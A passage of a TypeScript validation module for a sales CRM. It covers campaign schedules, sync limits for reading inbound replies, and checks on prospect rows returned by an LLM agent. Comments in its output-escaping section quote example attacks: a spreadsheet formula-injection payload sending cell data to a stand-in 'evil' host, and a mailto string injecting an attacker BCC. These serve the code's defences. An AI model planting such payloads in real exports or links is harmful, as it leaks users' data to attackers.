  if (!/^\d{1,20}$/.test(id)) {
    return { ok: false, error: `"${truncateForMessage(id)}" is not a valid campaign id.` };
  }
  return { ok: true, id };
}

/** Validate a campaign name for the create path. */
export function validateCampaignName(raw: unknown):
  | { ok: true; name: string }
  | { ok: false; error: string } {
  const name = asString(raw);
  if (!name) return { ok: false, error: "Campaign name is required." };
  if (name.length > LIMITS.campaignName) {
    return {
      ok: false,
      error: `Campaign name must be ${LIMITS.campaignName} characters or fewer.`,
    };
  }
  return { ok: true, name };
}

// ---------------------------------------------------------------------------
// Sequence builder
// ---------------------------------------------------------------------------

/**
 * Longest wait one step may sit on, in days.
 *
 * A real-world bound, not a Smartlead one — the same reasoning as the schedule
 * limits below. Every step's wait compounds into the campaign's total length, so
 * a mistyped 3000 doesn't produce an error, it produces a follow-up scheduled
 * after the company has changed name.
 */
export const MAX_STEP_DELAY_DAYS = 90;

/** Validate a step's wait, in days relative to the previous step. */
export function validateStepDelay(raw: unknown):
  | { ok: true; days: number }
  | { ok: false; error: string } {
  const days = Number(asString(raw));
  if (!Number.isInteger(days) || days < 0 || days > MAX_STEP_DELAY_DAYS) {
    return {
      ok: false,
      error: `The wait must be a whole number of days between 0 and ${MAX_STEP_DELAY_DAYS}.`,
    };
  }
  return { ok: true, days };
}

/**
 * Validate a step's variant choice.
 *
 * "all" is the wire spelling of null — every variant with copy, uploaded as
 * Smartlead's own A/B split. It is a distinct value rather than an empty string
 * so a dropped form field reads as missing, not as a deliberate un-pinning.
 */
export function validateStepVariant(raw: unknown):
  | { ok: true; slot: string | null }
  | { ok: false; error: string } {
  const value = asString(raw);
  if (value === "all") return { ok: true, slot: null };
  if (isValidVariantSlot(value)) return { ok: true, slot: value };
  return { ok: false, error: `Unknown variant "${truncateForMessage(value)}".` };
}

/**
 * Validate a posted step order.
 *
 * Capped at MAX_SEQUENCE_STEPS rather than left unbounded: the list is echoed
 * into one D1 batch, and this is the same ceiling the sequence itself is held to.
 * Ids that don't belong to the loop are dropped by reorderSequenceSteps, so this
 * only has to keep the shape sane.
 */
export function validateStepOrder(raw: unknown):
  | { ok: true; ids: string[] }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) return { ok: false, error: "Expected a list of steps." };
  if (raw.length > MAX_SEQUENCE_STEPS) {
    return {
      ok: false,
      error: `Too many steps: ${raw.length}. The maximum is ${MAX_SEQUENCE_STEPS}.`,
    };
  }
  const ids = [...new Set(raw.filter((id): id is string => typeof id === "string" && !!id))];
  if (!ids.length) return { ok: false, error: "No steps to reorder." };
  return { ok: true, ids };
}

export type ScheduleFields = {
  timezone: string;
  /** Days of the week Smartlead may send on, 0 = Sunday. Sorted, deduped, non-empty. */
  days: number[];
  startHour: string;
  endHour: string;
  minGapMinutes: number;
  maxLeadsPerDay: number;
  /** ISO instant the campaign should begin, or null for "as soon as it's started". */
  startAt: string | null;
};

// "HH:MM" on a 24-hour clock, which is the format Smartlead's schedule endpoint
// documents for start_hour / end_hour.
const HOUR_RE = /^([01]\d|2[0-3]):[0-5]\d$/;

// "UTC", or an IANA "Area/Location" identifier. Not checked against the real zone
// list — Workers has no tzdata to consult and Smartlead rejects an unknown zone
// itself; this only keeps something structurally absurd out of the request body.
const TIMEZONE_RE = /^(UTC|[A-Za-z_]+\/[A-Za-z0-9_+-]+)$/;

/**
 * Validate a sending-schedule form.
 *
 * Every bound here is a real-world sanity limit rather than a Smartlead one:
 * a campaign is a paid resource with a deliverability cost, and a mistyped
 * `max_new_leads_per_day` of 100000 burns a domain's reputation before anyone
 * notices. An empty `days` is rejected outright — Smartlead accepts it, and it
 * silently means the campaign never sends.
 */
export function validateSchedule(raw: unknown):
  | { ok: true; value: ScheduleFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const timezone = asString(r.timezone);
  if (!timezone) return { ok: false, error: "Timezone is required." };
  if (timezone.length > LIMITS.timezone || !TIMEZONE_RE.test(timezone)) {
    return { ok: false, error: `"${truncateForMessage(timezone)}" is not a valid timezone.` };
  }

  if (!Array.isArray(r.days)) return { ok: false, error: "Sending days must be an array." };
  const days = [
    ...new Set(r.days.map(Number).filter((n) => Number.isInteger(n) && n >= 0 && n <= 6)),
  ].sort((a, b) => a - b);
  if (!days.length) return { ok: false, error: "Pick at least one sending day." };

  const startHour = asString(r.startHour);
  const endHour = asString(r.endHour);
  if (!HOUR_RE.test(startHour) || !HOUR_RE.test(endHour)) {
    return { ok: false, error: "Sending hours must look like 09:00." };
  }
  if (startHour >= endHour) {
    // Lexicographic compare is exact for zero-padded HH:MM. Smartlead treats an
    // inverted window as an empty one, so the campaign silently never sends.
    return { ok: false, error: "The start hour must be before the end hour." };
  }

  const minGapMinutes = Number(asString(r.minGapMinutes));
  if (!Number.isInteger(minGapMinutes) || minGapMinutes < 1 || minGapMinutes > 1_440) {
    return { ok: false, error: "Minutes between emails must be between 1 and 1440." };
  }

  const maxLeadsPerDay = Number(asString(r.maxLeadsPerDay));
  if (!Number.isInteger(maxLeadsPerDay) || maxLeadsPerDay < 1 || maxLeadsPerDay > 10_000) {
    return { ok: false, error: "New leads per day must be between 1 and 10000." };
  }

  // Optional. Parsed rather than passed through so a malformed value fails here
  // instead of being rejected opaquely by Smartlead, and re-serialised to ISO so
  // the request body never carries a locale-dependent string.
  const rawStartAt = asString(r.startAt);
  let startAt: string | null = null;
  if (rawStartAt) {
    const ms = Date.parse(rawStartAt);
    if (Number.isNaN(ms)) {
      return { ok: false, error: "Start date isn’t a valid date and time." };
    }
    startAt = new Date(ms).toISOString();
  }

  return {
    ok: true,
    value: { timezone, days, startHour, endHour, minGapMinutes, maxLeadsPerDay, startAt },
  };
}

// ---------------------------------------------------------------------------
// Unipile (inbound replies)
// ---------------------------------------------------------------------------
//
// The read side of the integration. Every bound here is a subrequest budget: a
// Worker invocation has a finite number of outbound fetches, and one sync makes
// one call per account page, plus one per message page per account, plus one per
// LinkedIn chat it needs an attendee list for. These constants are what keep the
// worst case inside that ceiling and the button responsive.

/** Accounts read per page from `GET /accounts`. */
export const UNIPILE_ACCOUNT_PAGE = 100;

/**
 * Pages of accounts one read will fetch.
 *
 * A soft stop. This list is what /settings shows and what a sync iterates, so
 * reading part of it syncs fewer mailboxes rather than misreporting anything —
 * and 300 connected accounts is far past what a four-person CRM will ever hold.
 */
export const UNIPILE_ACCOUNT_MAX_PAGES = 3;

/** Messages (or emails) read per page during a sync. */
export const UNIPILE_MESSAGE_PAGE = 100;

/**
 * Pages of messages one sync will read PER ACCOUNT.
 *
 * A soft stop, unlike SMARTLEAD_STATS_MAX_PAGES. Nothing here is an absolute
 * total: a truncated read stores fewer replies, never a wrong one, and the
 * watermark only advances as far as what was actually read — so the next press
 * picks up the rest. That is the same argument migration 0015 makes about
 * contact marking being ungated by the page budget.
 */
export const UNIPILE_MESSAGE_MAX_PAGES = 5;

/**
 * LinkedIn chats one sync will fetch an attendee list for.
 *
 * LinkedIn messages carry no addressable identity — only a `sender_attendee_id`
 * — so every chat with a new inbound message costs one extra call to turn that
 * into a name and a profile URL. Chats are resolved newest-message-first, so a
 * sync that hits this ceiling drops the oldest conversations rather than an
 * arbitrary slice, and the watermark stops at the oldest message it resolved so
 * nothing is skipped permanently.
 */
export const UNIPILE_MAX_CHATS = 40;

/**
 * How far back the FIRST sync of an account reads, in days.
 *
 * Bounded rather than "everything", and this is a correctness bound rather than a
 * performance one. A mailbox holds years of correspondence, much of it with
 * people who are also in the CRM; reading all of it would stamp a "Replied"
 * touchpoint dated three years ago onto contacts who answered a different
 * conversation entirely, and promote half the book out of `New` on the strength
 * of it. Two weeks is recent enough to be about the outbound that is running now.
 */
export const UNIPILE_FIRST_SYNC_DAYS = 14;

/** Replies the contacts-page strip will render at once. */
export const UNIPILE_STRIP_LIMIT = 40;

/**
 * Validate a Unipile account id.
 *
 * Load-bearing beyond the usual bounds check: the value is interpolated into a
 * URL *path* (`DELETE /accounts/{id}`), so the character class is what stops it
 * carrying a `../` and re-pointing an authenticated request at a different
 * endpoint. Unipile's ids are opaque base62-ish handles rather than digits,
 * which is why this is wider than validateCampaignId — and why
 * unipile.server.ts re-checks it at the last moment anyway.
 */
export function validateUnipileAccountId(raw: unknown):
  | { ok: true; id: string }
  | { ok: false; error: string } {
  const id = asString(raw);
  if (!id) return { ok: false, error: "Missing account id." };
  if (!/^[A-Za-z0-9_=-]{1,128}$/.test(id)) {
    return { ok: false, error: `"${truncateForMessage(id)}" is not a valid account id.` };
  }
  return { ok: true, id };
}

// ---------------------------------------------------------------------------
// Output escaping
// ---------------------------------------------------------------------------

/**
 * Escape one CSV cell.
 *
 * Two separate jobs: RFC 4180 quoting (commas, quotes, newlines), and *formula
 * injection*. Excel and Google Sheets execute a cell beginning with `=`, `+`,
 * `-`, `@`, tab or CR, so an exported contact named
 * `=HYPERLINK("https://evil/"&A1,"Click")` runs on open. Prefixing with an
 * apostrophe forces the spreadsheet to treat it as literal text.
 */
export function csvCell(value: string): string {
  const raw = value ?? "";
  const neutralized = /^[=+\-@\t\r]/.test(raw) ? "'" + raw : raw;
  // Tabs are quoted alongside the RFC 4180 set because this app's own CSV
  // importer splits on /[,\t]/ — an unquoted tab would re-import into the wrong
  // column.
  return /[",\n\r\t]/.test(neutralized)
    ? '"' + neutralized.replace(/"/g, '""') + '"'
    : neutralized;
}

/**
 * Build a `mailto:` href from a stored address.
 *
 * A raw address is interpolated straight into the URL by the detail panel, so
 * `victim@corp.com?bcc=attacker@evil.com&body=…` would prefill an
 * attacker-controlled BCC and body in the user's mail client. Anything that
 * isn't a plain valid address gets no link at all.
 */
export function safeMailto(email: string): string | null {
  const s = asString(email);
  if (!isValidEmail(s)) return null;
  // Safe to interpolate directly: isValidEmail rejects whitespace and every
  // character with meaning in a URL (`? & = # % /`), which is exactly the set an
  // injected header would need. Percent-encoding on top of that would only
  // mangle legitimate addresses — `jane+crm@acme.co.uk` would become
  // `jane%2Bcrm@…`, which not every mail client decodes back.
  return "mailto:" + s;
}

// ---------------------------------------------------------------------------
// Prospecting (the Origami agent)
// ---------------------------------------------------------------------------

export type ProspectStatus = (typeof PROSPECT_STATUSES)[number];
export type ProspectStage = (typeof PROSPECT_STAGES)[number];
export type EmailConfidence = (typeof EMAIL_CONFIDENCE)[number];
export type DedupeReason = (typeof DEDUPE_REASONS)[number];

export function isValidProspectStatus(value: unknown): value is ProspectStatus {
  return typeof value === "string" && PROSPECT_STATUS_SET.has(value);
}

export function isValidProspectStage(value: unknown): value is ProspectStage {
  return typeof value === "string" && PROSPECT_STAGE_SET.has(value);
}

export function isValidEmailConfidence(value: unknown): value is EmailConfidence {
  return typeof value === "string" && EMAIL_CONFIDENCE_SET.has(value);
}

export function isValidDedupeReason(value: unknown): value is DedupeReason {
  return typeof value === "string" && DEDUPE_REASON_SET.has(value);
}

/** True for a terminal status a follow-up run on the same agent can continue from. */
export function isResumableProspectStatus(value: unknown): boolean {
  return typeof value === "string" && RESUMABLE_PROSPECT_STATUS_SET.has(value);
}

/** True while Origami is still working. The one non-terminal status. */
export function isProspectRunning(value: unknown): boolean {
  return value === "running";
}

/**
 * Bound the brief a user hands the agent.
 *
 * Length is the only check. There is deliberately no content filtering: the
 * whole point of the feature is that a salesperson describes who they want in
 * their own words, and a brief is passed to a third-party LLM agent, never
 * compiled into SQL or a URL. What *is* worth knowing is that this text is
 * wrapped by composeBrief() in app/crm/prospecting.ts before it is sent — the
 * column instructions around it are built server-side so the client cannot
 * replace them.
 */
export function validateProspectPrompt(raw: unknown):
  | { ok: true; prompt: string }
  | { ok: false; error: string } {
  const prompt = asString(raw);
  if (!prompt) return { ok: false, error: "Describe who you're looking for." };
  if (prompt.length > LIMITS.prospectPrompt) {
    return {
      ok: false,
      error: `Keep the brief to ${LIMITS.prospectPrompt} characters or fewer.`,
    };
  }
  return { ok: true, prompt };
}

/** One mapped row from an Origami table, on its way into `prospects`. */
export type ProspectFields = {
  name: string;
  company: string | null;
  title: string | null;
  email: string | null;
  phone: string | null;
  linkedin: string | null;
  location: string | null;
  sourceUrl: string | null;
  emailConfidence: EmailConfidence;
};

/**
 * Validate the rows mapped out of an Origami table.
 *
 * These arrive from a third party via an LLM agent, so they get the same
 * treatment as a pasted CSV: every row checked, invalid ones skipped rather than
 * failing the batch, and the count plus the first reason returned so the panel
 * can say what was dropped. A run that finds forty people and mangles three
 * should still show the other thirty-seven.
 *
 * A row with no name is dropped, because validateContact would reject it at
 * promotion time anyway and a blank row in the review list is just noise. A bad
 * email is NOT a reason to drop the row — the person may still be worth adding
 * by hand — so it is nulled out and the confidence falls to "none".
 */
export function validateProspectRows(raw: unknown):
  | { ok: true; rows: ProspectFields[]; skipped: number; firstError: string | null }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) {
    return { ok: false, error: "The agent returned something that wasn't a list of rows." };
  }

  const rows: ProspectFields[] = [];
  let skipped = 0;
  let firstError: string | null = null;

  const drop = (reason: string) => {
    skipped++;
    if (!firstError) firstError = reason;
  };

  for (const row of raw) {
    if (rows.length >= MAX_PROSPECTS_PER_RUN) break;

    const r = (row ?? {}) as Record<string, unknown>;

    const name = asString(r.name);
    if (!name) {
      drop("A row came back with no name.");
      continue;
    }
    if (name.length > LIMITS.name) {
      drop(`"${truncateForMessage(name)}" is too long to be a name.`);
      continue;
    }

    const company = asString(r.company).slice(0, LIMITS.company);
    const title = asString(r.title).slice(0, LIMITS.title);
    const location = asString(r.location).slice(0, LIMITS.source);
    // Capped, not format-checked, exactly like location and linkedin. A scraped
    // number arrives as "+1 (415) 555-0134 ext. 22" as readily as "4155550134",
    // and rejecting the shapes a regex doesn't know would throw away the field's
    // whole value. validateContact treats it the same way.
    const phone = asString(r.phone).slice(0, LIMITS.phone);
    const linkedin = asString(r.linkedin).slice(0, LIMITS.linkedin);
    const sourceUrl = asString(r.sourceUrl).slice(0, LIMITS.sourceUrl);

    // Nulled rather than dropped: the row is still a lead, just not a mailable
    // one. Keeping it is what lets someone look the person up by hand.
    const rawEmail = asString(r.email);
    const email = isValidEmail(rawEmail) ? rawEmail : "";

    const claimed = r.emailConfidence;
    const emailConfidence: EmailConfidence = !email
      ? "none"
      : isValidEmailConfidence(claimed) && claimed !== "none"
        ? claimed
        : "likely";

    rows.push({
      name,
      company: company || null,
      title: title || null,
      email: email || null,
      phone: phone || null,
      linkedin: linkedin || null,
      location: location || null,
      sourceUrl: sourceUrl || null,
      emailConfidence,
    });
  }

  return { ok: true, rows, skipped, firstError };
}
